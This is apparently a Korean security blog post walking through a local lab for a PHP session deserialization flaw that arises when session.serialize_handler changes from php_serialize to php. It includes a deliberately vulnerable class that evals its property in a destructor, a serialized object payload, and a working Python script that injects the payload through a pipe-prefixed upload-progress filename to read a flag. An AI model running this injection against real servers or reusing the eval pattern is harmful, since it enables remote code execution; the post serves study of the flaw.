---
layout: post
title:  "PHP session.serialize_handler가 php_serialize로 되어 있는 경우 역직렬화 취약점 발생"
tags: [WEB-Vuln,WEB-Study]
excerpt: "PHP session.serialize_handler이 php_serialize에서 php으로 변경될 경우 세션이 역직렬화 되는 과정에서 발생하는 역직렬화 취약점"
---
---

# PHP session.serialize_handler이란?

PHP 설정 세팅 중 [session.serialize_handler](https://www.php.net/manual/en/session.configuration.php#ini.session.serialize-handler)는 세션의 데이터를 모두 직렬화/역직렬화할 때 사용되는 핸들러입니다.

간단하게 PHP세션의 직렬화/역직렬화 방식 핸들러를 session.serialize_handler옵션을 이용하여 지정할 수 있게 됩니다.

php.net를 살펴보면 나와있는대로 default는 php으로 지정되어 있고 php_binary, php_serialize, wddx가 있다고 나와 있습니다.

이번 블로그 글에서 다룰 부분은 session.serialize_handler이 기본으로 php_serialize으로 설정 되어 있는 상태에서 로컬에서 session.serialize_handler을 php 으로 바꾸는 과정에서 발생할 수 있는 역직렬화 취약점을 적어볼려고 합니다.

---

## PHP session.serialize_handler php_serialize 작동 방식

먼저 session.serialize_handler은 위에서 언급했다시피 기본 값으로는 php으로 되어있습니다.

만약 php에서 ``session_start();`` 함수를 이용하여 세션을 시작하면 ``session_save_path()`` 경로에 ``sess_(PHPSESSID)`` 형식으로 파일에 세션 정보가 직렬화되어 저장됩니다

하지만 만약 session.serialize_handler이 php일 경우 

```php
<?php 

session_start();

$_SESSION['test'] = 'test';

echo session_save_path()."\n";

?>
```

위와 같은 코드를 실행시키면 세션이 시작되면서 session_save_path() 함수 결과의 위치에 세션 정보가 있는걸 볼 수 있습니다.

```bash
$ cat /var/lib/php/sessions/sess_02g9od7s6sn9iv9ob8q63g8u0i
test|s:4:"test";
```

하지만 해당 코드를 session.serialize_handler를 php_serialize로 바꾼 다음 세션 파일을 읽어보면 데이터 저장 형식이 조금 달라진것을 볼 수 있습니다.

```php
a:1:{s:4:"test";s:4:"test";}
```

이제 이러한 php_serialize 방식을 이용하여 php 으로 바꼇을 때 역직렬화 취약점이 발생할 수 있는걸 다뤄보겠습니다.

---

# PHP session.serialize_handler unserialize exploit

먼저 session.serialize_handler을 이용하여 역직렬화 취약점을 발생시킬 수 있는 사이트를 구축해볼려면

[php session.serialize_handler 취약점 발생할 수 있는 환경을 만들어야되는데](https://github.com/kimminwyk/web_vuln_site_code/tree/main/php_session.serialize_handler_php_serialize) 먼저 php.ini 파일 위치를 찾아 session.serialize_handler값을 php_serialize으로 바꾼 다음

+ [https://github.com/kimminwyk/web_vuln_site_code/tree/main/php_session.serialize_handler_php_serialize](https://github.com/kimminwyk/web_vuln_site_code/tree/main/php_session.serialize_handler_php_serialize)

위의 Github 코드와 똑같이 구축한 다음 소스코드를 분석해보면 config.php 파일에서 session.serialize_handler 값을 php으로 변경해주면 세션에 php_serialize으로 직렬화되어 저장되어 있던 데이터가 php으로 변경되면서 역직렬화되는 과정을 거치게 됩니다.

그리고 RCE 취약점을 발생시키기 위해서는 exploit 클래스의 command 값을 조작해야되는데

```php
ini_set("session.serialize_handler", "php");

class exploit{
    public $command;
    function __destruct() {
        eval($this->command);
    }
}

session_start();
```

위의 config.php 파일의 class exploit 부분을 똑같이 로컬에서 구축하여 serialize 함수를 이용해 데이터를 직렬화 해보면

[local test class exploit serialize](\post-images\PHP\SESSION\session.serialize_handler\local_test_exploit_class_serialize.png)

이렇게 ``O:7:"exploit":1:{s:7:"command";s:30:"include('/var/www/html/flag');";}`` exploit 클래스를 직렬화한 데이터가 출력되는것을 볼 수 있습니다.

---

## PHP session.upload_progress를 이용한 SESSION Upload

하지만 exploit 데이터를 가지고 있다고 해도 서버에다가 해당 정보를 전송 할 방법을 없기 때문에 

session.upload_progress.clenup 와 session.upload_progress.enable가 아래와 같이 구성되어 있는 경우

```
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
```

PHP에서 세션을 ``session_start()`` 함수를 사용하는 대신 POST로 ``PHP_SESSION_UPLOAD_PROGRESS`` 이름으로 파일 업로드하여 세션을 생성시킬 수 있습니다.

이제 ``session.upload_progress``을 이용하여 POST으로 요청하면 되는데 그냥 단순히 requests 모듈로 open 함수를 써서 files 매개변수에 값을 넣으면 url 인코딩되어 제대로된 값이 들어가지 않기 때문에 

직접 POST body 데이터를 만들어준 다음에 헤더에 me2nuk이라는 쿠키 이름으로 요청보내주면 sess_me2nuk 파일에 php_serialize 방식으로 직렬화된 데이터가 들어간 파일 이름이 직렬화 되어 

페이지에서는 command 이라는 변수가 조작되어 ``include('/var/www/html/flag');`` 코드가 실행되는걸 볼 수 있습니다.
 

```py
import requests

contents = """------Me2nukPHPSessionUploadProgress
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

me2nuk
------Me2nukPHPSessionUploadProgress
Content-Disposition: form-data; name="file"; filename="|O:7:\\"exploit\\":1:{s:7:\\"command\\";s:30:\\"include('/var/www/html/flag');\\";}"
Content-Type: text/plain

------Me2nukPHPSessionUploadProgress--"""

url = "http://127.0.0.1/"
headers = {
    "Content-Type": "multipart/form-data; boundary=Me2nukPHPSessionUploadProgress",
    "Cookie": "PHPSESSID=me2nuk"
}
r = requests.post(url, headers=headers, data=contents)

print(r.request.body)

result = requests.get(url, headers=headers).text

print(result)
```

하지만 보통은 filename에 들어가게 되면 모든 세션의 정보가 하나로 직렬화되어 sess_me2nuk 파일에 저장되어있을텐데

저렇게 따로 데이터를 분리시켜 exploit 이라는 클래스를 조작할 수 있는 이유는 

\| 특수문자를 이용하여 세션 정보를 분리시켜줄 수 있었기 때문입니다.

만약 \| 파이프를 넣지 않으면 세션 정보로 구별되어 exploit 클래스에 전혀 영향을 끼치지 않으므로 filename 첫번째에 \| 파이프를 넣어준 다음 직렬화된 exploit 클래스 정보를 넣어주면 됩니다.

![_request python](\post-images\PHP\SESSION\session.serialize_handler\_request.py.png)

그러면 이렇게 요청한 결과 ``FLAG{phP_sEssi0n_s2rla1ize_haNd12R_pHp_s2ria1ize}``가 나오는걸 볼 수 있습니다.

---

## 후기

이 블로그에서 다룬 내용은 간단하게 ``session.upload_progress.clenup``, ``session.upload_progress.enabled``, ``session.serialize_handler`` 설정을 이용하여 클래스를 조작할 수 있는 주제에 대해 다뤘는데 

처음에는 잘 몰라서 삽질했지만 이 기회에 재밌는 취약점을 공부하여 좋았습니다.